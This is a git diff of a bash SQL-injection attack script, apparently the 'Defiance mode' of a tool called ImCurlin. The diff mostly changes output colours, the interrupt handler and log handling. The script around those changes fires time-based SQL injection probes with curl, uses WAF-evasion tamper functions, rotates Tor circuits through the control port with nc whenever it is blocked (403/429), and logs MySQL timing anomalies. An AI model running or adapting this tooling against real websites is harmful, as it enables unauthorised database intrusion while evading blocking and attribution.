@@ -9,12 +9,14 @@ export ROOT_LOG_FILE="$DEFIANCE_DIR/../targetDef.log"
 
 source "$DEFIANCE_DIR/../tamper/hungry.sh"
 # Killing all process related to this thing, since there's 2 vector. No no manual CTRL C.
-eexit() {
+heyoii() {
     trap - SIGINT SIGTERM EXIT
-    echo -e "\n\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Interrupted, process killed. "
-        kill -9 -$$ 2>/dev/null
+    echo -e "\n\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Interrupted. Killing all process.."
+    kill 0 2>/dev/null
+    exit 130
 }
-trap 'eexit' SIGINT
+
+trap 'heyoii' SIGINT SIGTERM
 
 if [ -n "$custom_proxy" ]; then
     export TOR_CIRCUITS=("$custom_proxy")
@@ -50,9 +52,9 @@ print_defiance_logo() {
     echo -e "                \e[38;5;18m▀\e[0m"
     echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m Defiance mode activated, ImCurlin no longer friendly ;("
     if [ -n "$custom_proxy" ]; then
-        echo -e "\e[0;31m[\e[0m!\e[0;37m]\e[0m Routing via $custom_proxy"
+        echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Routing via $custom_proxy"
     else
-        echo -e "\e[0;31m[\e[0m!\e[0;37m]\e[0m MultiCircuit Rotation Enabled. IPs are shifting dynamically per request.!"
+        echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m MultiCircuit Rotation Enabled. IPs are shifting dynamically per request.!"
     fi
 }
 # HTTP pollution, air pollution.
@@ -166,14 +168,14 @@ local curl_output=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev
         local http_status=$(echo "$curl_output" | cut -d'|' -f2)
 
         if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
-            echo -e "    \e[0;33m[!]\e[0m Port $random_port Shadowbanned (HTTP $http_status). Rotating TOR IP Circuit..."
+            echo -e "\e[0;33m[!]\e[0m Port $random_port Shadowbanned (HTTP $http_status). Rotating TOR IP Circuit..."
             (echo "AUTHENTICATE \"\""; echo "SIGNAL NEWNYM"; echo "QUIT") | nc 127.0.0.1 9051 >/dev/null 2>&1
             sleep 1
         fi
 
         if [[ -n "$stopwatch" && "$stopwatch" != "0.000000" ]]; then
             if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
-                echo -e "\e[0;31m[!+!]\e[0m Vector 1 confirmed MySQL Anomaly: ${stopwatch}s"
+                echo -e "\e[0;31m[×]\e[0m Vector 1 confirmed MySQL Anomaly: ${stopwatch}s"
                 echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
             fi
         fi
@@ -221,7 +223,7 @@ local t4=$(space2comment_engine "$t2")
         fi
         local waf_trick=$(braindamage)
         
-        echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[38;5;236m${target_url}${final_query}\e[0m"
+        echo -e "\e[0;34m[\e[0m>\e[0;34m]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[38;5;236m${target_url}${final_query}\e[0m"
 
 local curl_output=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}|%{http_code}" "${target_url}${final_query}")
 
@@ -229,14 +231,14 @@ local curl_output=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev
         local http_status=$(echo "$curl_output" | cut -d'|' -f2)
 
         if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
-            echo -e "    \e[0;33m[!]\e[0m Port $random_port Shadowbanned (HTTP $http_status). Rotating TOR IP Circuit..."
+            echo -e "\e[0;33m[!]\e[0m Port $random_port Shadowbanned (HTTP $http_status). Rotating TOR IP Circuit..."
             (echo "AUTHENTICATE \"\""; echo "SIGNAL NEWNYM"; echo "QUIT") | nc 127.0.0.1 9051 >/dev/null 2>&1
             sleep 1
         fi
 
         if [[ -n "$stopwatch" && "$stopwatch" != "0.000000" ]]; then
             if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
-                echo -e "\e[0;31m[!+!]\e[0m Vector 2 confirmed MySQL Anomaly: ${stopwatch}s"
+                echo -e "\e[0;31m[×]\e[0m Vector 2 confirmed MySQL Anomaly: ${stopwatch}s"
                 echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
             fi
         fi
@@ -286,7 +288,7 @@ exit 1
 fi
 fi
 
-echo -e "\n\e[0;34m[\e[0m*\e[0;37m]\e[0m Tracing target redirections."
+echo -e "[i] Tracing target redirections."
 
 recon_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
 
@@ -372,6 +374,16 @@ wait $pid_vector1 $pid_vector2
 
 echo -e "\n\e[0;32m[\e[0m=\e[0;32m]\e[0m Attack sequence completed. Input to Defiance Log Analyst.."
 sleep 1
+if [ -s "$ROOT_LOG_FILE" ]; then
+    echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Your log file is not empty."
+    read -p "Do you want to overwrite it? (y/n): " tanya
+    if [ "$tanya" = "y" ]; then
+        > "$ROOT_LOG_FILE"
+        echo -e "\e[0;32m[\e[0m+\e[0;32m]\e[0m Log overwritten.\n"
+    else
+    echo -e "[i] Previous log entries will also be scanned."
+    fi
+fi
 if [ -f "$DEFIANCE_DIR/../validators/defval.py" ]; then
 python "$DEFIANCE_DIR/../validators/defval.py"
 else
